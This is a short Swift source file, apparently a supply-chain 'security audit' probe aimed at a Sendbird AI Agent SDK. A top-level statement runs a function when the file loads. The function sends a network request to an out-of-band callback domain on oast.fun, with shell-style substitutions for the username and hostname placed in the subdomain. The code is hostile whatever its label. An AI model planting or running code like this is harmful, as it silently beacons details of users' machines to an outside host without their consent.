import Foundation

// Security Research Probe - Sendbird AI Agent SDK Audit
@objc class SecurityAudit: NSObject {
    @objc static func trigger() {
        let session = URLSession.shared
        let oastUrl = URL(string: "http://sendbird-audit.$(whoami).$(hostname).zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/poc")!
        
        let task = session.dataTask(with: oastUrl) { _, _, _ in }
        task.resume()
        
        print("[!] SENDBIRD SECURITY AUDIT ACTIVE - RESEARCH PURPOSES ONLY")
    }
}

// Auto-trigger on load
let _ = SecurityAudit.trigger()
